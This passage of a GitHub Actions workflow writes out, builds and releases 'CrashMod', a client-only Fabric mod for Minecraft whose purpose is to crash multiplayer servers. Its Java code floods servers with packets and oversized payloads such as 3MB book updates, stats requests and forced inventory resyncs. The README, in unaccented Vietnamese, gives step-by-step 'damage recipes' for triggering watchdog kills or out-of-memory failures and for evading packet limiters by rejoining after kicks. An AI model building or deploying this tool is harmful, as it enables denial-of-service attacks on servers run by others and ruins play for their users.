          cat > src/main/java/vn/venice/crashmod/net/BigPayload.java <<'EOF'
          package vn.venice.crashmod.net;

          import net.minecraft.network.RegistryByteBuf;
          import net.minecraft.network.codec.PacketCodec;
          import net.minecraft.network.codec.PacketCodecs;
          import net.minecraft.network.packet.CustomPayload;
          import net.minecraft.util.Identifier;

          /** Payload 32KB: server phai doc 32KB roi WARN moi packet. */
          public record BigPayload(byte[] data) implements CustomPayload {

              public static final BigPayload INSTANCE = new BigPayload(new byte[32768]);

              public static final CustomPayload.Id<BigPayload> ID =
                      new CustomPayload.Id<>(Identifier.of("crashmod", "flood_big"));

              public static final PacketCodec<RegistryByteBuf, BigPayload> CODEC =
                      PacketCodec.tuple(PacketCodecs.BYTE_ARRAY, BigPayload::data, BigPayload::new);

              @Override
              public CustomPayload.Id<? extends CustomPayload> getId() { return ID; }
          }
          EOF
          fi

          if [ ! -f src/main/java/vn/venice/crashmod/client/Packets.java ]; then
          cat > src/main/java/vn/venice/crashmod/client/Packets.java <<'EOF'
          package vn.venice.crashmod.client;

          import it.unimi.dsi.fastutil.ints.Int2ObjectArrayMap;
          import net.minecraft.client.MinecraftClient;
          import net.minecraft.client.network.ClientPlayerEntity;
          import net.minecraft.item.Items;
          import net.minecraft.network.packet.c2s.common.CustomPayloadC2SPacket;
          import net.minecraft.network.packet.c2s.play.BookUpdateC2SPacket;
          import net.minecraft.network.packet.c2s.play.ButtonClickC2SPacket;
          import net.minecraft.network.packet.c2s.play.ClientCommandC2SPacket;
          import net.minecraft.network.packet.c2s.play.ClientStatusC2SPacket;
          import net.minecraft.network.packet.c2s.play.ClickSlotC2SPacket;
          import net.minecraft.network.packet.c2s.play.CloseHandledScreenC2SPacket;
          import net.minecraft.network.packet.c2s.play.HandSwingC2SPacket;
          import net.minecraft.network.packet.c2s.play.PickItemFromBlockC2SPacket;
          import net.minecraft.network.packet.c2s.play.PlayerActionC2SPacket;
          import net.minecraft.network.packet.c2s.play.PlayerInputC2SPacket;
          import net.minecraft.network.packet.c2s.play.PlayerInteractBlockC2SPacket;
          import net.minecraft.network.packet.c2s.play.PlayerInteractItemC2SPacket;
          import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;
          import net.minecraft.network.packet.c2s.play.RequestCommandCompletionsC2SPacket;
          import net.minecraft.network.packet.c2s.play.UpdatePlayerAbilitiesC2SPacket;
          import net.minecraft.network.packet.c2s.play.UpdateSelectedSlotC2SPacket;
          import net.minecraft.network.packet.c2s.play.UpdateSignC2SPacket;
          import net.minecraft.screen.slot.SlotActionType;
          import net.minecraft.screen.sync.ItemStackHash;
          import net.minecraft.util.Hand;
          import net.minecraft.util.PlayerInput;
          import net.minecraft.util.hit.BlockHitResult;
          import net.minecraft.util.math.BlockPos;
          import net.minecraft.util.math.Direction;
          import net.minecraft.util.math.Vec3d;
          import vn.venice.crashmod.net.BigPayload;
          import vn.venice.crashmod.net.FloodPayload;

          import java.util.ArrayList;
          import java.util.List;
          import java.util.Optional;

          public final class Packets {

              private Packets() {}

              private static int tx = 0;
              private static int fillSlot = 0;

              private static final String LONG_CMD   = "/" + "a".repeat(2000);
              private static final String SIGN_LINE  = "A".repeat(384);
              private static final String BOOK_TITLE = "A".repeat(512);

              private static final List<String> BOOK_25K  = book(100, 255);
              private static final List<String> BOOK_100K = book(100, 1000);
              private static final List<String> BOOK_3M   = book(100, 32767);

              /** Ban KHONG nen duoc: ky tu gia ngau nhien -> deflate gan nhu vo dung. */
              private static final List<String> BOOK_MIX = mix(100, 32767);

              private static List<String> book(int pages, int chars) {
                  String unit = "A".repeat(chars);
                  List<String> out = new ArrayList<>(pages);
                  for (int i = 0; i < pages; i++) out.add(unit);
                  return out;
              }

              private static List<String> mix(int pages, int chars) {
                  StringBuilder sb = new StringBuilder(chars);
                  int seed = 12345;
                  for (int i = 0; i < chars; i++) {
                      seed = seed * 1103515245 + 12345;
                      sb.append((char) ('!' + Math.floorMod(seed >> 16, 90)));
                  }
                  String unit = sb.toString();
                  List<String> out = new ArrayList<>(pages);
                  for (int i = 0; i < pages; i++) out.add(unit);
                  return out;
              }

              private static int sel(ClientPlayerEntity p) {
                  return p.getInventory().getSelectedSlot();
              }

              public static boolean holdingBook(ClientPlayerEntity p) {
                  return p.getInventory().getStack(sel(p)).isOf(Items.WRITABLE_BOOK);
              }

              private static double hopX = Double.NaN, hopZ = 0;

              public static void send(MinecraftClient client, int code) {
                  ClientPlayerEntity p = client.player;
                  if (p == null || p.networkHandler == null) return;
                  tx++;

                  switch (code) {

                      // ---------------- FLOOD ----------------
                      case 1 -> p.networkHandler.sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));

                      case 2 -> p.networkHandler.sendPacket(new PlayerMoveC2SPacket.LookAndOnGround(
                              p.getYaw(), p.getPitch(), true, false));

                      case 3 -> p.networkHandler.sendPacket(new PlayerMoveC2SPacket.Full(
                              p.getX(), p.getY(), p.getZ(), p.getYaw(), p.getPitch(), true, false));

                      case 4 -> p.networkHandler.sendPacket(
                              new UpdatePlayerAbilitiesC2SPacket(p.getAbilities()));

                      case 5 -> p.networkHandler.sendPacket(new PlayerInputC2SPacket(
                              new PlayerInput(false, false, false, false, false, tx % 2 == 0, false)));

                      case 6 -> p.networkHandler.sendPacket(new ClientCommandC2SPacket(
                              p, ClientCommandC2SPacket.Mode.START_SPRINTING));

                      // ---------------- BOMB ----------------
                      case 7 -> p.networkHandler.sendChatMessage("CrashMod " + tx);

                      case 8 -> p.networkHandler.sendChatCommand("crashmod" + tx);

                      case 9 -> p.networkHandler.sendPacket(
                              new CustomPayloadC2SPacket(FloodPayload.INSTANCE));

                      case 10 -> p.networkHandler.sendPacket(
                              new CustomPayloadC2SPacket(BigPayload.INSTANCE));

                      case 11 -> p.networkHandler.sendPacket(
                              new RequestCommandCompletionsC2SPacket(tx, "/"));

                      case 12 -> p.networkHandler.sendPacket(
                              new RequestCommandCompletionsC2SPacket(tx, LONG_CMD));

                      case 13 -> p.networkHandler.sendPacket(new RequestCommandCompletionsC2SPacket(
                              tx, "/" + (char) ('a' + (tx % 26))));

                      case 14 -> {
                          BlockPos pos = BlockPos.ofFloored(p.getX(), p.getY(), p.getZ());
                          p.networkHandler.sendPacket(new UpdateSignC2SPacket(
                                  pos, true, SIGN_LINE, SIGN_LINE, SIGN_LINE, SIGN_LINE));
                          p.networkHandler.sendPacket(new UpdateSignC2SPacket(
                                  pos, false, SIGN_LINE, SIGN_LINE, SIGN_LINE, SIGN_LINE));
                      }

                      case 15 -> book(p, BOOK_25K, false);
                      case 16 -> book(p, BOOK_100K, false);
                      case 17 -> book(p, BOOK_3M, false);
                      case 18 -> book(p, BOOK_3M, true);

                      // ---------------- GUI / INVENTORY ----------------
                      case 19 -> p.networkHandler.sendPacket(
                              new CloseHandledScreenC2SPacket(p.currentScreenHandler.syncId));

                      case 20 -> p.networkHandler.sendPacket(new UpdateSelectedSlotC2SPacket(tx % 9));

                      case 21 -> p.networkHandler.sendPacket(new PlayerActionC2SPacket(
                              PlayerActionC2SPacket.Action.DROP_ITEM, BlockPos.ORIGIN, Direction.DOWN));

                      case 22 -> click(p, (short) 0);

                      case 23 -> click(p, (short) 999);

                      case 24 -> p.networkHandler.sendPacket(
                              new ButtonClickC2SPacket(p.currentScreenHandler.syncId, 0));

                      case 25 -> p.networkHandler.sendPacket(new PlayerActionC2SPacket(
                              PlayerActionC2SPacket.Action.SWAP_ITEM_WITH_OFFHAND,
                              BlockPos.ORIGIN, Direction.DOWN));

                      case 26 -> p.networkHandler.sendPacket(
                              new UpdateSelectedSlotC2SPacket(tx % 2 == 0 ? 0 : 8));

                      // ghi sach vao TUNG slot -> lam day tui bang sach nang
                      case 37 -> {
                          bookSlot(p, fillSlot % 36, BOOK_3M, true);
                          fillSlot++;
                      }

                      case 38 -> {
                          bookSlot(p, fillSlot % 36, BOOK_MIX, true);
                          fillSlot++;
                      }

                      // ---------------- CHUNK / STATUS ----------------
                      case 27 -> {
                          if (Double.isNaN(hopX)) { hopX = p.getX(); hopZ = p.getZ(); }
                          hopX += 8.0;
                          if (hopX > 15000.0) { hopX = -15000.0; hopZ += 512.0; }
                          p.networkHandler.sendPacket(new PlayerMoveC2SPacket.Full(
                                  hopX, p.getY(), hopZ, p.getYaw(), p.getPitch(), true, false));
                      }

                      case 28 -> p.networkHandler.sendPacket(new PlayerMoveC2SPacket.LookAndOnGround(
                              (float) (Math.random() * 720.0 - 360.0),
                              (float) (Math.random() * 180.0 - 90.0), true, false));

                      case 29 -> p.networkHandler.sendPacket(
                              new ClientStatusC2SPacket(ClientStatusC2SPacket.Mode.PERFORM_RESPAWN));

                      case 30 -> p.networkHandler.sendPacket(
                              new ClientStatusC2SPacket(ClientStatusC2SPacket.Mode.REQUEST_STATS));

                      case 31 -> {
                          BlockPos pos = p.getBlockPos().down();
                          p.networkHandler.sendPacket(new PlayerInteractBlockC2SPacket(
                                  Hand.MAIN_HAND,
                                  new BlockHitResult(
                                          new Vec3d(pos.getX() + 0.5, pos.getY() + 1.0, pos.getZ() + 0.5),
                                          Direction.UP, pos, false),
                                  tx));
                      }

                      case 32 -> p.networkHandler.sendPacket(new PlayerInteractItemC2SPacket(
                              Hand.MAIN_HAND, tx, p.getYaw(), p.getPitch()));

                      case 33 -> p.networkHandler.sendPacket(
                              new PickItemFromBlockC2SPacket(p.getBlockPos().down(), true));

                      // ---------------- COMBO ----------------
                      case 34 -> {
                          if (tx % 500 == 0) book(p, BOOK_3M, true);
                          click(p, (short) 0);
                      }

                      case 35 -> {
                          int[] ring = {1, 2, 3, 4, 5, 7, 9, 11, 14, 19, 22, 27, 28};
                          send(client, ring[tx % ring.length]);
                      }

                      case 36 -> {
                          int[] ring = {10, 13, 18, 23, 24, 25, 29, 30, 31, 32, 33};
                          send(client, ring[tx % ring.length]);
                      }

                      default -> { }
                  }
              }

              /** revision = tx (SAI) -> server syncState() gui lai full inventory */
              private static void click(ClientPlayerEntity p, short slot) {
                  p.networkHandler.sendPacket(new ClickSlotC2SPacket(
                          p.currentScreenHandler.syncId,
                          tx,
                          slot,
                          (byte) 0,
                          SlotActionType.PICKUP,
                          new Int2ObjectArrayMap<ItemStackHash>(),
                          ItemStackHash.EMPTY));
              }

              private static void book(ClientPlayerEntity p, List<String> pages, boolean titled) {
                  bookSlot(p, sel(p), pages, titled);
              }

              private static void bookSlot(ClientPlayerEntity p, int slot, List<String> pages, boolean titled) {
                  p.networkHandler.sendPacket(new BookUpdateC2SPacket(
                          slot, pages,
                          titled ? Optional.of(BOOK_TITLE) : Optional.empty()));
              }
          }
          EOF
          fi

          if [ ! -f src/main/java/vn/venice/crashmod/client/CrashModClient.java ]; then
          cat > src/main/java/vn/venice/crashmod/client/CrashModClient.java <<'EOF'
          package vn.venice.crashmod.client;

          import net.fabricmc.api.ClientModInitializer;
          import net.fabricmc.fabric.api.client.event.lifecycle.v1.ClientTickEvents;
          import net.fabricmc.fabric.api.client.keybinding.v1.KeyBindingHelper;
          import net.minecraft.client.MinecraftClient;
          import net.minecraft.client.option.KeyBinding;
          import net.minecraft.client.util.InputUtil;
          import net.minecraft.util.Identifier;
          import org.lwjgl.glfw.GLFW;
          import vn.venice.crashmod.Config;
          import vn.venice.crashmod.CrashRegistry;

          public class CrashModClient implements ClientModInitializer {

              public static KeyBinding openKey;

              private static final KeyBinding.Category CATEGORY =
                      KeyBinding.Category.create(Identifier.of("crashmod", "main"));

              /** trang thai phim o tick truoc - tu bat canh len, khong phu thuoc Screen */
              private static boolean keyHeld = false;

              @Override
              public void onInitializeClient() {
                  Config.load();

                  openKey = KeyBindingHelper.registerKeyBinding(new KeyBinding(
                          "key.crashmod.open", InputUtil.Type.KEYSYM,
                          GLFW.GLFW_KEY_M, CATEGORY));

                  ClientTickEvents.END_CLIENT_TICK.register(client -> {
                      handleGuiKey(client);
                      tick(client);
                  });
              }

              /**
               * Doc thang trang thai phim tu GLFW -> mo GUI duoc o BAT KY dau:
               * title screen, menu, server list, trong world, dang mo chat, dang o inventory.
               */
              private static void handleGuiKey(MinecraftClient client) {
                  InputUtil.Key bound = InputUtil.fromTranslationKey(openKey.getBoundKeyTranslationKey());

                  if (bound.getCategory() == InputUtil.Type.KEYSYM) {
                      boolean down = InputUtil.isKeyPressed(client.getWindow().getHandle(), bound.getCode());
                      if (down && !keyHeld) ToggleScreen.toggle(client);
                      keyHeld = down;
                      while (openKey.wasPressed()) { }   // drain, tranh double-fire
                  } else {
                      while (openKey.wasPressed()) ToggleScreen.toggle(client);
                  }
              }

              private static void tick(MinecraftClient client) {
                  int[] codes = Config.activeCodes;
                  if (codes.length == 0) return;
                  if (client.player == null || client.getNetworkHandler() == null) return;

                  int rate = Config.rate();
                  for (int code : codes) {
                      // mode ONCE: server chi lam duoc 1 lan/tick -> gui 1 packet, khong nhan rate
                      int n = CrashRegistry.isOnce(code) ? 1 : rate;
                      for (int i = 0; i < n; i++) Packets.send(client, code);
                  }
              }
          }
          EOF
          fi

          if [ ! -f src/main/java/vn/venice/crashmod/client/ToggleScreen.java ]; then
          cat > src/main/java/vn/venice/crashmod/client/ToggleScreen.java <<'EOF'
          package vn.venice.crashmod.client;

          import net.minecraft.client.MinecraftClient;
          import net.minecraft.client.gui.screen.Screen;
          import net.minecraft.client.gui.screen.ingame.HandledScreen;
          import net.minecraft.client.gui.widget.ButtonWidget;
          import net.minecraft.client.gui.widget.TextWidget;
          import net.minecraft.text.Text;
          import vn.venice.crashmod.Config;
          import vn.venice.crashmod.CrashRegistry;

          public class ToggleScreen extends Screen {

              /** man hinh se quay ve khi dong GUI. null = ve game. */
              private static Screen returnTo;

              private static String hint =
                      "Bam 1 mode de doc ghi chu. Mode do (CAM) chi gui 1 packet/tick.";

              public ToggleScreen() { super(Text.literal("CrashMod v2")); }

              public static void toggle(MinecraftClient client) {
                  Screen cur = client.currentScreen;

                  if (cur instanceof ToggleScreen) {
                      Screen back = returnTo;
                      returnTo = null;
                      client.setScreen(back);
                      return;
                  }

                  returnTo = (cur instanceof HandledScreen) ? null : cur;
                  client.setScreen(new ToggleScreen());
              }

              @Override
              public void close() {
                  MinecraftClient mc = MinecraftClient.getInstance();
                  Screen back = returnTo;
                  returnTo = null;
                  mc.setScreen(back);
              }

              private static void rebuild() {
                  MinecraftClient.getInstance().setScreen(new ToggleScreen());
              }

              private static String colorOf(String group) {
                  return switch (group) {
                      case CrashRegistry.G_FLOOD -> "\u00a77";
                      case CrashRegistry.G_BOMB  -> "\u00a7e";
                      case CrashRegistry.G_INV   -> "\u00a7b";
                      case CrashRegistry.G_CHUNK -> "\u00a7d";
                      default                    -> "\u00a7c";
                  };
              }

              private static Text label(CrashRegistry.Mode m) {
                  String tag = Config.isOn(m.id()) ? "[x] " : "[ ] ";
                  String once = CrashRegistry.isOnce(m.code()) ? "\u00a78" : "";
                  return Text.literal(colorOf(m.group()) + tag + once + m.label());
              }

              private void line(Text text, int y, int centerX, MinecraftClient mc) {
                  int w = mc.textRenderer.getWidth(text);
                  addDrawableChild(new TextWidget(centerX - w / 2, y, w, 9, text, mc.textRenderer));
              }

              @Override
              protected void init() {
                  MinecraftClient mc = MinecraftClient.getInstance();
                  int centerX = this.width / 2;

                  int cols = 4, colW = 110, h = 15, gapX = 5, gapY = 1;
                  int totalW = cols * colW + (cols - 1) * gapX;
                  int startX = centerX - totalW / 2;

                  boolean inWorld = mc.player != null && mc.getNetworkHandler() != null;
                  boolean hasBook = inWorld && Packets.holdingBook(mc.player);

                  line(Text.literal(inWorld
                          ? "\u00a7fphim M  \u00a78|  \u00a7abat: \u00a7f" + Config.enabled.size()
                            + "  \u00a78|  \u00a7arate: \u00a7f" + Config.rate()
                            + " pkt/tick  \u00a78(mode xam bo qua rate)"
                          : "\u00a7fphim M  \u00a78|  \u00a7abat: \u00a7f" + Config.enabled.size()
                            + "  \u00a78|  \u00a7arate: \u00a7f" + Config.rate()
                            + "  \u00a7eCHUA VAO SERVER \u00a78- chua gui packet"), 3, centerX, mc);

                  line(Text.literal(!inWorld
                          ? "\u00a78vao world roi thi mode da bat se tu chay"
                          : hasBook
                              ? "\u00a7asach tren tay: CO \u00a78- book bomb san sang"
                              : "\u00a7csach tren tay: KHONG \u00a78- cam SACH VA BUT de dung Book*"),
                          12, centerX, mc);

                  line(Text.literal("\u00a77FLOOD \u00a7eBOMB \u00a7bGUI/INV \u00a7dCHUNK \u00a7cCOMBO"
                          + "  \u00a78|  \u00a77xam = ONCE (1 packet/tick, khong tinh rate)"), 21, centerX, mc);

                  line(Text.literal("\u00a78" + hint), 30, centerX, mc);

                  int i = 0;
                  for (CrashRegistry.Mode m : CrashRegistry.MODES) {
                      final CrashRegistry.Mode mode = m;
                      int x = startX + (i % cols) * (colW + gapX);
                      int y = 40 + (i / cols) * (h + gapY);
                      addDrawableChild(ButtonWidget.builder(label(mode), b -> {
                          hint = mode.label() + ": " + mode.hint();
                          Config.toggle(mode.id());
                          rebuild();
                      }).dimensions(x, y, colW, h).build());
                      i++;
                  }

                  int rows = (CrashRegistry.MODES.size() + cols - 1) / cols;
                  int sy = 40 + rows * (h + gapY) + 4;

                  addDrawableChild(ButtonWidget.builder(Text.literal("\u00a7c-"), b -> {
                      Config.bumpRate(-1); rebuild();
                  }).dimensions(startX, sy, 26, 18).build());

                  addDrawableChild(ButtonWidget.builder(Text.literal("\u00a7a+"), b -> {
                      Config.bumpRate(1); rebuild();
                  }).dimensions(startX + 30, sy, 26, 18).build());

                  addDrawableChild(ButtonWidget.builder(Text.literal("\u00a7dKILL"), b -> {
                      Config.killPreset(); rebuild();
                  }).dimensions(startX + 60, sy, 56, 18).build());

                  addDrawableChild(ButtonWidget.builder(Text.literal("BAT HET"), b -> {
                      Config.setAll(true); rebuild();
                  }).dimensions(startX + 120, sy, 96, 18).build());

                  addDrawableChild(ButtonWidget.builder(Text.literal("TAT HET"), b -> {
                      Config.setAll(false); rebuild();
                  }).dimensions(startX + 220, sy, 96, 18).build());

                  addDrawableChild(ButtonWidget.builder(Text.literal("Dong"), b -> close())
                          .dimensions(startX + 320, sy, 60, 18).build());
              }
          }
          EOF
          fi

          # ======================= README ======================= #
          if [ ! -f README.md ]; then
          cat > README.md <<'EOF'
          # CrashMod v2.3 — Minecraft 1.21.11

          Client-only. **Server KHONG can cai.** Chi can Fabric Loader + Fabric API o phia client.

          ## Cai dat
          1. Minecraft 1.21.11 + Fabric Loader >= 0.15
          2. Bo **Fabric API** vao `.minecraft/mods/`
          3. Bo `crashmod-1.21.11-*.jar` vao `.minecraft/mods/`

          ## Mo bang dieu khien
          Bam phim **M**. Mo duoc o BAT KY dau: title screen, menu, server list, trong world,
          dang mo chat / pause / inventory. **KHONG can vao server van mo duoc.**

          - Bam M lan nua hoac `Esc` / nut **Dong** de dong.
          - Doi phim: Options > Controls > CrashMod.

          ---

          # DOC CAI NAY TRUOC KHI BAO "MOD KEM"

          Server lai **1 thread chay 20 tick/s**. Muon sap no thi phai lam 1 trong 3:
          1 tick > 60s (watchdog kill), het heap, hoac nghen netty.

          Client-only nghia la ban bi gioi han boi **duong truyen cua ban**. Nen:
          **dung do bang rate, do bang CPU server tren moi byte ban gui.**

          ## 3 hieu lam chet nguoi

          1. **Sach 'A' x 32767 nen duoc ~1000:1.** "3MB" la 3MB *sau giai nen*.
             Tren day no chi ~30KB. Nen `Book 3MB` rate 2-5 = 40-100 cuon/s thi
             **client ban moi la thang chet truoc** (phai deflate 3.3MB x 40), server khong thay gi.
          2. **Rate cao cho `click`/`resync`/`close_gui` la vo nghia.** Server chi
             `sendContentUpdates()` **1 lan moi tick**. 1000 packet click = van 1 lan gui inventory.
          3. **`payload`/`swing`/`look`/`move` la packet re.** Day rate 50000 chi ton CPU client.

          ## Trong tam dung

          | Do | Client gui | Server phai lam |
          |---|---|---|
          | `Stats` | ~15 byte | lap ~5000 stat + build map + gui lai, **NGAY moi packet** |
          | `resync` + **tui day sach 3MB** | 5 byte | serialize + deflate **ca inventory, moi tick** |
          | `fill_mix` | 0 | noi dung khong nen -> nghen duong truyen |

          ## Mode xam = ONCE

          Cac mode hien chu **xam** chi gui **1 packet/tick** du rate bao nhieu, vi server
          cung chi lam duoc 1 lan/tick. Rate khong anh huong chung. Dung rate cao cho chung la phi.

          ---

          ## GUI co gi
          - Dong 1: phim, so mode dang bat, rate (pkt/tick).
          - Dong 2: canh bao sach tren tay.
          - Dong 3: bang mau theo nhom.
          - Dong 4: ghi chu cua mode vua bam.
          - 38 nut mode, 4 cot. `[x]` = dang bat, chu xam = ONCE.
          - Nut: `-` `+` `KILL` `BAT HET` `TAT HET` `Dong`

          ## Mau = nhom
          | Mau | Nhom | Nghia |
          |---|---|---|
          | xam | FLOOD | re tien, spam so luong lon -> de bi packet-limiter kick |
          | vang | BOMB | dat tien, moi packet work khong lo |
          | xanh | GUI/INV | ep server resync inventory |
          | tim | CHUNK | di chuyen / status / interact |
          | do | COMBO | preset to hop |

          ## Rate goi y (chi ap dung cho mode KHONG phai xam)
          | Mode | Rate |
          |---|---|
          | Swing / Look / Move / Abilities / Input / Sprint | 500 - 5000 |
          | Chat / Cmd sai / Tab / Tab dai / Tab nhieu | 50 - 500 |
          | Payload / Payload32K | 500 - 5000 |
          | Stats | 200 - 2000 |
          | Drop / Button / Right block / Right item / Pick | 100 - 1000 |
          | Chunk hop | 5 - 50 |
          | Move loan | 20 - 200 |
          | NUKE / NUKE 2 | 10 - 100 |

          Mode ONCE (xam) bo qua rate: slot, close_gui, click, resync, swap_hand, slot_flip,
          book_s, book_m, book_x, book_title, book_click, fill_inv, fill_mix, respawn.

          ---

          # CONG THUC SAT THUONG

          ## A. Don CPU — `Stats` (nhe nhat, manh nhat)
          1. Bat `Stats`, rate **500**.
          2. Moi packet 15 byte -> server lap ~5000 stat + serialize + gui lai.
          3. Tick 20k-100k lan -> tick 10-60s -> **watchdog kill**.
          4. Client khong phai nen gi (packet nho hon nguong nen).

          ## B. Don inventory — sat thuong cao nhat
          Chuan bi: 36 **sach va but** (creative hoac craft). Writable book stack 16,
          component dinh CA STACK -> ghi 1 cuon la 16 cuon trong slot do nang 3.3MB.

          1. Cam 1 cuon. `BAT HET` tat. Bat `Fill sach`. De ~40 tick cho no ghi het slot 0-35.
          2. Tat `Fill sach`. Tui ban gio chua 36 slot x 16 cuon x 3.3MB = **~1.9GB**.
          3. Bat `Resync inv`. Rate **1** la du.
          4. Moi tick server phai serialize + deflate 1.9GB -> **tick 5-20s, TPS 0**.
          5. Them `Stats` rate 200 -> them CPU.

          Neu muon **OOM** thay vi lag: dung `Fill khong nen` (fill_mix). Noi dung
          khong nen duoc -> 1.9GB phai di that tren day -> netty queue phinh -> OOM.

          ## C. Do client chiu duoc
          `Fill sach` + `Resync inv` nang o CA HAI phia. Client yeu thi:
          chi fill 9 slot hotbar, hoac dung `Book 100KB` thay `Book 3MB`.

          ## D. Chong bi kick
          Paper/Purpur mac dinh co packet-limiter 500 packet / 7 giay = ~71 pkt/s.
          `Stats` rate 500 = 10.000 pkt/s -> **KICK ngay**. Chon 1 trong 2:
          - rate <= 3 (nhung `Stats` se yeu)
          - hoac de bi kick, vao lai, spam tiep

          ## KILL preset
          Bam `KILL` = `resync` + `book_click` + `stats` rate 100.
          Can co sach trong tui thi moi that su dau.

          ## Test nhanh mod co an khong
          | Bat | Phai thay |
          |---|---|
          | `Swing` rate 20 | tay vung lien tuc |
          | `Look` rate 20 | camera quay loan |
          | `Chat` rate 5 | chat spam "CrashMod 1, 2, 3..." |
          | `Book 100KB` | mo sach thay day chu A |
          | `Stats` | server bat dau tut TPS |

          ## Luu y
          - Config luu o `.minecraft/config/crashmod.properties`. Mode van bat sau khi restart.
          - `Chunk hop` KHONG lam man hinh ban bay - server moi la ben bay.
          - Bi kick khac voi server sap.
          - `BAT HET` la do: no tron mode ONCE voi mode flood. Muon do dung thi bat tay.
          EOF
          fi

          echo "=== FILES ==="
          find src -type f | sort

      - name: Tao gradle wrapper (LUON ghi lai, khong dung [ -f ])
        run: |
          set -euo pipefail
          gradle wrapper --gradle-version "${GRADLE_VERSION}" --no-daemon
          chmod +x gradlew
          echo "--- gradle-wrapper.properties ---"
          cat gradle/wrapper/gradle-wrapper.properties

      - uses: actions/upload-artifact@v4
        with:
          name: source
          retention-days: 3
          path: |
            build.gradle
            settings.gradle
            gradle.properties
            gradlew
            gradlew.bat
            gradle/
            src/
            LICENSE
            README.md
            .gitignore
            run/

  # ==========================================================================
  # JOB 2 - BUILD
  # ==========================================================================
  build:
    name: Build ${{ matrix.mc }}
    needs: prepare
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      matrix:
        include:
          - { mc: '1.21.11', yarn: '1.21.11+build.4', fabric: '0.141.6+1.21.11' }
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-java@v4
        with:
          distribution: temurin
          java-version: '21'

      - uses: gradle/actions/setup-gradle@v4
        with:
          gradle-version: '9.2.0'

      - uses: actions/download-artifact@v4
        with:
          name: source

      - name: Cache Minecraft dev env (loom)
        uses: actions/cache@v4
        with:
          path: |
            ~/.gradle/caches/fabric-loom
            ~/.gradle/caches/modules-2
          key: loom-${{ runner.os }}-${{ matrix.mc }}-${{ hashFiles('gradle.properties') }}
          restore-keys: |
            loom-${{ runner.os }}-${{ matrix.mc }}-

      - name: Build
        run: |
          set -euo pipefail
          gradle build --no-daemon --console=plain --stacktrace \
            -Pminecraft_version=${{ matrix.mc }} \
            -Pyarn_mappings=${{ matrix.yarn }} \
            -Pfabric_version=${{ matrix.fabric }}

      - name: Validate jar
        run: |
          set -euo pipefail
          python3 - <<'PY'
          import glob, json, os, zipfile
          jars = [j for j in glob.glob("build/libs/*.jar") if "sources" not in j]
          if not jars: raise SystemExit("!! khong co jar")
          jar = max(jars, key=os.path.getsize)
          need = ["fabric.mod.json",
                  "vn/venice/crashmod/CrashMod.class",
                  "vn/venice/crashmod/Config.class",
                  "vn/venice/crashmod/CrashRegistry.class",
                  "vn/venice/crashmod/net/FloodPayload.class",
                  "vn/venice/crashmod/net/BigPayload.class",
                  "vn/venice/crashmod/client/CrashModClient.class",
                  "vn/venice/crashmod/client/Packets.class",
                  "vn/venice/crashmod/client/ToggleScreen.class"]
          with zipfile.ZipFile(jar) as z:
              names = set(z.namelist())
              for n in need:
                  if n not in names: raise SystemExit(f"!! thieu {n}")
              m = json.loads(z.read("fabric.mod.json"))
              assert m["id"] == "crashmod"
              assert "client" in m["entrypoints"]
          print("OK ->", jar, os.path.getsize(jar), "bytes")
          PY

      - uses: actions/upload-artifact@v4
        with:
          name: crashmod-jar
          path: |
            build/libs/*.jar
            !build/libs/*-sources.jar

  # ==========================================================================
  # JOB 3 - SMOKE TEST (co the bo qua)
  # ==========================================================================
  smoke-test:
    name: Smoke test
    needs: [ decide, build ]
    if: needs.decide.outputs.smoke == 'co'
    runs-on: ubuntu-latest
    timeout-minutes: 15
    steps:
      - name: Thong bao
        run: |
          echo "::notice title=Smoke test::Dang chay vi smoke=co."

      - uses: actions/checkout@v4

      - uses: actions/setup-java@v4
        with:
          distribution: temurin
          java-version: '21'

      - uses: gradle/actions/setup-gradle@v4
        with:
          gradle-version: '9.2.0'

      - uses: actions/download-artifact@v4
        with:
          name: source

      - name: Cache Minecraft dev env (loom)
        uses: actions/cache@v4
        with:
          path: |
            ~/.gradle/caches/fabric-loom
            ~/.gradle/caches/modules-2
          key: loom-${{ runner.os }}-1.21.11-${{ hashFiles('gradle.properties') }}
          restore-keys: |
            loom-${{ runner.os }}-1.21.11-

      - name: Chay dedicated server headless
        run: |
          set -uo pipefail
          mkdir -p run
          echo "eula=true" > run/eula.txt
          printf 'online-mode=false\nmax-players=2\nview-distance=4\nlevel-type=flat\n' > run/server.properties
          rm -rf run/logs || true

          START=$(date +%s)
          gradle runServer --no-daemon --console=plain > stdout.log 2>&1 &
          GPID=$!

          OK=0
          for i in $(seq 1 120); do
            grep -qs "CrashMod\] da nap" run/logs/latest.log && { OK=1; break; }
            sleep 2
          done
          END=$(date +%s)

          echo ">> boot mat $((END-START))s"
          tail -n 30 run/logs/latest.log 2>/dev/null || tail -n 30 stdout.log || true
          pkill -f devlaunchinjector || true
          kill "$GPID" 2>/dev/null || true
          sleep 2

          [ "$OK" = "1" ] || { echo "::error title=Smoke test::FAIL - server khong boot duoc"; exit 1; }
          echo "::notice title=Smoke test::PASS sau $((END-START))s"

      - uses: actions/upload-artifact@v4
        if: failure()
        with:
          name: smoke-logs
          if-no-files-found: ignore
          path: |
            run/logs/latest.log
            stdout.log

  # ==========================================================================
  # JOB 4 - RELEASE
  # ==========================================================================
  release:
    name: Release
    needs: [ decide, build, smoke-test ]
    if: >-
      always() && !cancelled()
      && needs.decide.outputs.release == 'co'
      && needs.build.result == 'success'
      && (needs.smoke-test.result == 'success' || needs.smoke-test.result == 'skipped')
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Meta
        id: meta
        run: |
          set -euo pipefail
          SHORT=$(echo "${GITHUB_SHA}" | cut -c1-7)
          if [[ "${GITHUB_REF}" == refs/tags/v* ]]; then
            echo "tag=${GITHUB_REF#refs/tags/}"           >> "$GITHUB_OUTPUT"
            echo "name=CrashMod ${GITHUB_REF#refs/tags/}" >> "$GITHUB_OUTPUT"
            echo "pre=false"                              >> "$GITHUB_OUTPUT"
            echo "latest=true"                            >> "$GITHUB_OUTPUT"
          else
            echo "tag=nightly"                            >> "$GITHUB_OUTPUT"
            echo "name=CrashMod nightly (${SHORT})"       >> "$GITHUB_OUTPUT"
            echo "pre=true"                               >> "$GITHUB_OUTPUT"
            echo "latest=false"                           >> "$GITHUB_OUTPUT"
          fi

      - uses: actions/download-artifact@v4
        with:
          name: source
          path: src-artifact

